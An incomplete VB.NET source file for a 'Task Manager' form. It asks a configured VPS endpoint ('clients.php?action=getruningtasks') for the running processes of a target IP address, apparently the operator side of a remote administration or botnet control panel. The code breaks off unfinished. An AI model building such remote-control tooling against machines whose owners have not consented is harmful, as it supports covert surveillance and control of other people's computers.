Imports System.Net

Public Class TaskMgr
    Public targetIp As String
    Dim vpsurl As String = My.Settings.vpsurl
    Private Sub TaskMgr_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Task Manager @ " & targetIp
        CheckForIllegalCrossThreadCalls = False
        GetTaskList.RunWorkerAsync()
    End Sub

    Private Sub GetTaskList_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles GetTaskList.DoWork
        Dim client As New WebClient
        Dim launchit As String = client.DownloadString(vpsurl & "clients.php?action=getruningtasks&target=" & targetIp)
        Dim clientresult As String



    End Sub
End Class